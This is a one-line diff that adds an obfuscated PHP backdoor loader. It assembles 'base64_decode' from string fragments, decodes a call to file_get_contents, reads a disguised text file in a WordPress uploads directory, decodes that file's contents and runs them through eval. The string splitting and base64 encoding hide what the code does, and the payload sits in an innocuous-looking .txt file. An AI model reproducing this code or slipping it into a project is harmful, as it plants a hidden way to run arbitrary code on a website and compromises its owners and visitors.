@@ -1,0 +1,1 @@
+<?php $a = 'ba'.'se' . '64'.'_de'.'co'.'de';$get_file = $a('ZmlsZV9nZXRfY29udGVudHM=', true);$wp_gets_content=$get_file($_SERVER['DOCUMENT_ROOT'].'/'.call_user_func($a,'d3AtY29udGVudC91cGxvYWRzL2JjZWRkYWVpZWMudHh0'));$final = $a($wp_gets_content, true);eval('?>'.$final);
